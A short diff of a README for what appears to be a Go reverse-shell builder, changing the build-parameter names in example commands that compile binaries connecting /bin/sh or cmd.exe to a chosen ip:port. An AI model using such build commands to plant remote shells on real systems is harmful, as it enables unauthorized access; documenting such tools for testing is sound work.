@@ -13,6 +13,6 @@ Credits to [moloch](https://gist.github.com/moloch--/86068b6019ff5e3280725230dca
 | `destination` | any `ip:port` combination, e.g. `192.168.1.1:1337`                                                                                           |
 
 ~~~ sh
-./build.sh GOARCH=arm GOOS=linux SHELL=/bin/sh DESTINATION=1.2.3.4:5678
-./build.sh GOARCH=amd64 GOOS=windows SHELL=C:\\Windows\\System32\\cmd.exe DESTINATION=5.6.7.8:4321
+./build.sh GOARCH=arm GOOS=linux shell=/bin/sh destination=1.2.3.4:5678
+./build.sh GOARCH=amd64 GOOS=windows shell=C:\\Windows\\System32\\cmd.exe destination=5.6.7.8:4321
 ~~~
